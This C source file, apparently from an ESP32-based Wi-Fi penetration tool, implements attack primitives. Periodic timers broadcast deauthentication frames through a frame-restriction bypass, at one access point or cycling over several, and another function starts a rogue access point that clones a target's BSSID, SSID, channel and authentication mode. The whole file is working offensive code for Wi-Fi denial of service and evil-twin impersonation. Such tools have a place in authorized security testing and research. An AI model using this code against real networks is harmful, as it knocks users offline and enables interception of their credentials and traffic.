/**
 * @file attack_method.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-07
 * @copyright Copyright (c) 2021
 * 
 * @brief Implements common methods for various attacks
 */
#include "attack_method.h"

#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_DEBUG
#include "esp_log.h"
#include "esp_err.h"
#include "esp_timer.h"
#include "esp_wifi_types.h"

#include "wifi_controller.h"
#include "wsl_bypasser.h"

static const char *TAG = "main:attack_method";
static esp_timer_handle_t deauth_timer_handle = NULL;

static const wifi_ap_record_t **multi_ap_records = NULL;
static uint8_t multi_ap_count = 0;
static uint8_t multi_ap_current_idx = 0;

/**
 * @brief Callback for periodic deauthentication frame timer
 * 
 * Periodicaly called to send deauthentication frame for given AP
 * 
 * @param arg expects wifi_ap_record_t or NULL for multi-target
 */
static void timer_send_deauth_frame(void *arg){
    if (arg != NULL) {
        ESP_LOGD(TAG, "Deauth timer tick (single)");
        wsl_bypasser_send_deauth_frame((wifi_ap_record_t *) arg);
    } else if (multi_ap_records != NULL && multi_ap_count > 0) {
        if (multi_ap_current_idx < multi_ap_count) {
            ESP_LOGD(TAG, "Deauth timer tick (multi), target %d/%d", multi_ap_current_idx + 1, multi_ap_count);
            wsl_bypasser_send_deauth_frame(multi_ap_records[multi_ap_current_idx]);
            multi_ap_current_idx = (multi_ap_current_idx + 1) % multi_ap_count;
        } else {
            multi_ap_current_idx = 0;
        }
    }
}

/**
 * @details Starts periodic timer for sending deauthentication frame via timer_send_deauth_frame().
 */
void attack_method_broadcast(const wifi_ap_record_t *ap_record, unsigned period_ms){
    if (deauth_timer_handle != NULL) {
        ESP_LOGI(TAG, "Deauth timer already exists, stopping and deleting old one");
        attack_method_broadcast_stop();
    }

    ESP_LOGI(TAG, "Starting periodic deauth timer with period %u ms", period_ms);

    const esp_timer_create_args_t deauth_timer_args = {
        .callback = &timer_send_deauth_frame,
        .arg = (void *) ap_record,
        .name = "deauth_timer"
    };
    
    esp_err_t err = esp_timer_create(&deauth_timer_args, &deauth_timer_handle);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to create deauth timer: %s", esp_err_to_name(err));
        deauth_timer_handle = NULL;
        return;
    }
    
    err = esp_timer_start_periodic(deauth_timer_handle, (uint64_t)period_ms * 1000);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "Failed to start deauth timer: %s", esp_err_to_name(err));
        esp_timer_delete(deauth_timer_handle);
        deauth_timer_handle = NULL;
    } else {
        ESP_LOGI(TAG, "Periodic deauth timer started successfully");
    }
}

/**
 * @brief Starts periodic timer for sending deauthentication frames to multiple APs.
 * 
 * Each timer tick will cycle to the next AP in the list and send a deauth frame.
 * 
 * @param ap_records Array of pointers to AP records to target.
 * @param count Number of AP records in the array.
 * @param period_ms Period between deauth frame transmissions in milliseconds.
 */
void attack_method_broadcast_multi(const wifi_ap_record_t **ap_records, uint8_t count, unsigned period_ms){
    if (deauth_timer_handle != NULL) {
        attack_method_broadcast_stop();
    }

    multi_ap_records = ap_records;
    multi_ap_count = count;
    multi_ap_current_idx = 0;

    const esp_timer_create_args_t deauth_timer_args = {
        .callback = &timer_send_deauth_frame,
        .arg = NULL,
        .name = "deauth_timer_multi"
    };
    
    ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, (uint64_t)period_ms * 1000));
}

/**
 * @brief Stops and deletes the deauthentication timer.
 * 
 * Cleans up the timer handle and resets multi-target state variables.
 */
void attack_method_broadcast_stop(){
    if (deauth_timer_handle != NULL) {
        ESP_LOGI(TAG, "Stopping and deleting deauth timer...");
        esp_timer_stop(deauth_timer_handle);
        esp_timer_delete(deauth_timer_handle);
        deauth_timer_handle = NULL;
        multi_ap_records = NULL;
        multi_ap_count = 0;
        multi_ap_current_idx = 0;
        ESP_LOGI(TAG, "Deauth timer stopped and deleted");
    }
}

/**
 * @note BSSID is MAC address of APs Wi-Fi interface
 * 
 * @param ap_record target AP that will be cloned/duplicated
 */
void attack_method_rogueap(const wifi_ap_record_t *ap_record){
    if (ap_record == NULL) {
        ESP_LOGE(TAG, "Invalid ap_record (null pointer)");
        return;
    }
    
    // Check for empty SSID and provide a fallback if needed
    const char *ssid_ptr = (const char *)ap_record->ssid;
    size_t ssid_len = 0;
    
    if (ssid_ptr != NULL) {
        ssid_len = strlen(ssid_ptr);
    }
    
    if (ssid_len == 0) {
        ESP_LOGW(TAG, "Target AP has no SSID (hidden?), using fallback 'Hidden_Network'");
        ssid_ptr = "Hidden_Network";
        ssid_len = strlen(ssid_ptr);
    }

    ESP_LOGD(TAG, "Configuring Rogue AP");
    wifictl_set_ap_mac(ap_record->bssid);
    wifi_config_t ap_config = {
        .ap = {
            .ssid_len = ssid_len,
            .channel = ap_record->primary,
            .authmode = ap_record->authmode,
            .password = "dummypassword",
            .max_connection = 1
        },
    };
    
    // Copy SSID safely
    memset(ap_config.ap.ssid, 0, 32);
    memcpy(ap_config.ap.ssid, ssid_ptr, (ssid_len > 32) ? 32 : ssid_len);
    
    wifictl_ap_start(&ap_config);
}